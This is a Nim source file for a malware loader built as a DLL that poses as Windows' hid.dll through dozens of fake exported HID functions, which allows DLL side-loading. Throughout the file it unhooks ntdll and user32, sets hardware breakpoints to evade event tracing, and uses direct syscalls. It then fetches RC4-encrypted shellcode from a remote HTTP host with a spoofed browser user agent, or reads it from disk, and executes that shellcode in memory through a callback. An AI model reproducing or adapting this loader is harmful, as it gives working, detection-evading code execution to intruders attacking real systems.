import core/[rc_for, morph, unhk_module, static_strs, etw_hwbp]
import std/[strutils, os, sequtils, macros, random]
import nimvoke/dinvoke 
import nimvoke/syscalls
import core/util
from base64 import decode 
from winim import NTSTATUS, NT_SUCCESS, HANDLE, WINBOOL, HWINSTA, LPCWSTR, ULONG, NULL, PVOID, LPVOID, SIZE_T, PSIZE_T, LPARAM, LRESULT, WPARAM, UINT, HWND, WM_USER,
                  HHOOK, WM_DESTROY, WM_NULL, WM_APP, PM_REMOVE, WH_GETMESSAGE, CS_VREDRAW, CS_HREDRAW, IDI_APPLICATION, IDC_ARROW, WHITE_BRUSH, DWORD,
                  HMENU, HINSTANCE, WS_OVERLAPPEDWINDOW, HWND_MESSAGE, SW_SHOWDEFAULT, MSG, WNDCLASSEXW, DESKTOPENUMPROCA, PAGE_EXECUTE_READ, MEM_COMMIT, 
                  HOOKPROC, ATOM, MEM_RESERVE, PAGE_READWRITE, FILE_SYNCHRONOUS_IO_NONALERT, FILE_NON_DIRECTORY_FILE, FILE_SHARE_READ, FILE_GENERIC_READ,
                  SYNCHRONIZE, OBJ_CASE_INSENSITIVE, FILE_STANDARD_INFORMATION, OBJECT_ATTRIBUTES, UNICODE_STRING, IO_STATUS_BLOCK, FILE_INFORMATION_CLASS,
                  ACCESS_MASK, DLL_PROCESS_ATTACH, BOOL, 
                  RtlDosPathNameToNtPathName_U, InitializeObjectAttributes, GetProcessWindowStation, GetCurrentThreadId, GetModuleHandle,
                  DefWindowProcW, LoadIconW, LoadCursorW, GetStockObject, GetModuleHandleW, SendMessage, Sleep, TranslateMessage, DispatchMessageW, GetMessageW,
                  UpdateWindow, ShowWindow, PostQuitMessage, Sleep, `L`, `&`

when defined(net):
  import core/build_ua
  import httpclient, net

# nim c --app:lib -d:strip -d:ondisk/net -d:release --passL:"-def:hid.def" --nomain --cc:gcc --passL:-static --out:hid.dll loader_hid_t2.nim

proc NimMain() {.cdecl, importc.}

let 
  url       = jam("http://172.16.0.4:8000/test.bin_encrypted.txt")
  proxyUrl  = ""
  rc4Key    = jam("test")
  datName   = jam("test.bin_encrypted.dat")

var 
  g_hHook: HHOOK
  g_triggered = false 

const 
  WM_SHOWWINDOW = 0x0018
  FS_INFORMATION: FILE_INFORMATION_CLASS = FILE_INFORMATION_CLASS(5'i32)

dinvokeDefine(EnumDesktopsA, "user32.dll", proc (hwinsta: HWINSTA, lpEnumFunc: DESKTOPENUMPROCA, lParam: LPARAM): WINBOOL {.stdcall.})
dinvokeDefine(CreateWindowExW, "user32.dll", proc (dwExStyle: DWORD, lpClassName: LPCWSTR, lpWindowName: LPCWSTR, dwStyle: DWORD, X: int32, Y: int32, nWidth: int32, nHeight: int32, hWndParent: HWND, hMenu: HMENU, hInstance: HINSTANCE, lpParam: LPVOID): HWND {.stdcall.})
dinvokeDefine(RegisterClassExW, "user32.dll", proc (P1: ptr WNDCLASSEXW): ATOM {.stdcall.})
dinvokeDefine(PostThreadMessageA, "user32.dll", proc (idThread: DWORD, Msg: UINT, wParam: WPARAM, lParam: LPARAM): WINBOOL {.stdcall.})
dinvokeDefine(SetWindowsHookExA, "user32.dll", proc (idHook: int32, lpfn: HOOKPROC, hmod: HINSTANCE, dwThreadId: DWORD): HHOOK {.stdcall.})
dinvokeDefine(CallNextHookEx, "user32.dll", proc (hhk: HHOOK, nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.})
dinvokeDefine(UnhookWindowsHookEx, "user32.dll", proc (hhk: HHOOK): WINBOOL {.stdcall.})

#[proc delay(delay: int64) =
  var 
    hTimer: HANDLE
    liDueTime: LARGE_INTEGER

  hTimer = CreateWaitableTimer(NULL, TRUE, NULL)
  liDueTime.QuadPart = -convertSeconds(delay)
  SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, 0)
  WaitForSingleObject(hTimer, INFINITE)
  CloseHandle(hTimer)]#

proc HidD_MainRoutine(): bool =
  var 
    shellcode: seq[byte]
    data: string
    decrypted: string
    
  when defined(ondisk):
    var
      fStatus : NTSTATUS
      hFile   : HANDLE 
      isob    : IO_STATUS_BLOCK 
      ntUs    : UNICODE_STRING 
      oa      : OBJECT_ATTRIBUTES 
      fsi     : FILE_STANDARD_INFORMATION 
      ifLen   : ULONG = ULONG(sizeof(fsi))
    
    let scDatPath = joinPath(getAppDir(), datName)
    if not fileExists(scDatPath): quit(3)
    let wdatPath = newWideCString(scDatPath)
    RtlDosPathNameToNtPathName_U(wdatPath, &ntUs, NULL, NULL)
    InitializeObjectAttributes(&oa, &ntUs, OBJ_CASE_INSENSITIVE, 0, NULL)

    let desired : ACCESS_MASK = ACCESS_MASK(FILE_GENERIC_READ or SYNCHRONIZE)
    let share   : ULONG       = ULONG(FILE_SHARE_READ)
    let options : ULONG       = ULONG(FILE_SYNCHRONOUS_IO_NONALERT or FILE_NON_DIRECTORY_FILE)

    fStatus = syscall(NtOpenFile, &hFile, desired, &oa, &isob, share, options)
    fStatus = syscall(NtQueryInformationFile, hFile, &isob, cast[pointer](&fsi), ifLen, FS_INFORMATION)
    
    let fs = int(fsi.EndOfFile.QuadPart)
    if fs <= 0:
      discard syscall(NtClose, hFile)
      quit(3)
    
    var sc = newSeq[byte](fs)
    fStatus = syscall(NtReadFile, hFile, 0, 0, 0, &isob, cast[pointer](&sc[0]), ULONG(fs), NULL, NULL)
    
    decrypted = bytesToString(rc4Apply(toBytes(rc4Key), sc))
    shellcode = toByteSeq(decrypted)

  when defined(net):
    let 
      ua = buildChromiumUA()
      headers = [
        ("User-Agent", ua),
        ("Content-Type", "text/plain, */*"),
        ("Accept-Encoding", "base64")
      ]

    var
      client: HttpClient 
      response: Response 
    
    if proxyUrl.len > 4:
      let proxy = newProxy(proxyUrl)
      client = newHttpClient(proxy=proxy)
    else:
      echo "set reg client"
      client = newHttpClient()
    
    #client.timeout = 10

    for (key, value) in headers:
      client.headers.add(key, value)
    
    response = client.request(url, httpMethod=HttpGet)
    if response.code.is2xx:
      data = frcDec(rc4Key, decode(response.body))
      sc = toByteSeq(data)
    else:
      quit(3)
    
    if not client.isNil:
      client.close()

  var
    iStatus  : NTSTATUS
    baseAddr : PVOID 
    hProc    : HANDLE = 0xFFFFFFFFFFFFFFFF
    scSize   : SIZE_T = shellcode.len.SIZE_T 
  
  iStatus = syscall(NtAllocateVirtualMemory, hProc, &baseAddr, 0, &scSize, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
  if not NT_SUCCESS(iStatus):
    return false 

  var bytesWritten: SIZE_T
  iStatus = syscall(ZwWriteVirtualMemory, hProc, baseAddr, &shellcode[0], scSize.SIZE_T, cast[PSIZE_T](&bytesWritten))
  if not NT_SUCCESS(iStatus):
    return false 

  var oldProtect: DWORD
  iStatus = syscall(ZwProtectVirtualMemory, hProc, &baseAddr, &scSize, PAGE_EXECUTE_READ, &oldProtect)
  if not NT_SUCCESS(iStatus):
    return false 
  
  discard EnumDesktopsA(GetProcessWindowStation(), cast[DESKTOPENUMPROCA](baseAddr), cast[LPARAM](NULL))
  return true 

proc getMsgProc(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} = 
  if nCode >= 0 and wParam == PM_REMOVE:
    var msg = cast[ptr MSG](lParam)

    # Look for the second trigger message
    if msg.message == WM_USER + 100 and not g_triggered:
      discard HidD_MainRoutine()
      
      g_triggered = true 
      if g_hHook != 0:
        discard UnhookWindowsHookEx(g_hHook)
        g_hHook = 0

  return CallNextHookEx(g_hHook, nCode, wParam, lParam)

proc hkSetup() = 
  let tid = GetCurrentThreadId()
  g_hHook = SetWindowsHookExA(WH_GETMESSAGE, getMsgProc, GetModuleHandle(NULL), tid)
  if g_hHook == 0:
    return 

  discard PostThreadMessageA(tid, WM_USER + 100, 0, 0)

proc windProc(hWnd: HWND, uMsg: UINT, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} = 
  case uMsg
    of WM_SHOWWINDOW:
      if not g_triggered:
        discard uhkModule(jam("ntdll.dll"))
        discard setHWBPForNTTE()
        discard uhkModule(jam("user32.dll"))
        hkSetup()
        return 0 
      
    of WM_DESTROY:
      PostQuitMessage(0)
      return 0 
    
    else:
      return DefWindowProcW(hWnd, uMsg, wParam, lParam)

# Send something else a few times before the first trigger
proc sendMessages(hwnd: HWND) =
  for i in 0 ..< 7: 
    let randMsgTW = [WM_NULL, WM_USER, WM_APP, 0x0400, 0x0410, 0x0420].sample()
    discard SendMessage(hwnd, randMsgTW.UINT, 0, 0)
    Sleep(1000)
  discard SendMessage(hwnd, WM_SHOWWINDOW, 1, 0) 

proc main() = 
  let clsName = L"HidDWindowz"
  var wc: WNDCLASSEXW 

  wc.cbSize = sizeof(wc).UINT
  wc.style = CS_HREDRAW or CS_VREDRAW
  wc.lpfnWndProc = windProc
  wc.cbClsExtra = 0
  wc.cbWndExtra = 0
  wc.hInstance = GetModuleHandleW(NULL)
  wc.hIcon = LoadIconW(0, IDI_APPLICATION)
  wc.hCursor = LoadCursorW(0, IDC_ARROW)
  wc.hbrBackground = GetStockObject(WHITE_BRUSH)
  wc.lpszMenuName = NULL
  wc.lpszClassName = clsName
  wc.hIconSm = LoadIconW(0, IDI_APPLICATION)
  
  if RegisterClassExW(&wc) == 0:
    return
  
  let hwnd = CreateWindowExW(0, clsName, NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, HWND_MESSAGE, 0, wc.hInstance, NULL)
  if hwnd == 0:
    return 
  
  sendMessages(hwnd)
  discard ShowWindow(hwnd, SW_SHOWDEFAULT)
  discard UpdateWindow(hwnd)
  
  var msg: MSG
  while GetMessageW(&msg, 0, 0, 0) != 0:
    TranslateMessage(&msg)
    DispatchMessageW(&msg)

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  if fdwReason == DLL_PROCESS_ATTACH:
    NimMain()
  return true 

proc `HidD_FreePreparsedData`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetAttributes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetConfiguration`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetFeature`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetHidGuid`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetIndexedString`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetInputReport`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetManufacturerString`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetMsGenreDescriptor`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetNumInputBuffers`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetPhysicalDescriptor`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_PreparsedData`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetProductString`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_GetSerialNumberString`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_Hello`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_SetConfiguration`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_SetFeature`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_SetNumInputBuffers`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidD_SetOutputReport`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetButtonArray`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetButtonCaps`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetCaps`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetData`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetExtendedAttributes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetLinkCollectionNodes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetScaledUsageValue`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetSpecificButtonCaps`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetSpecificValueCaps`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetUsageValue`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetUsageValueArray`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetUsages`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetUsagesEx`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetValueCaps`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_GetGetVersionInternal`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_InitializeReportForID`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_MaxDataListLength`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_MaxUsageListLength`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_SetButtonArray`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_SetData`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_SetScaledUsageValue`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_SetUsageValueArray`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_SetUsages`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_TranslateUsagesToI8042ScanCodes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_UnsetUsages`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `HidP_UsageListDifference`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

main()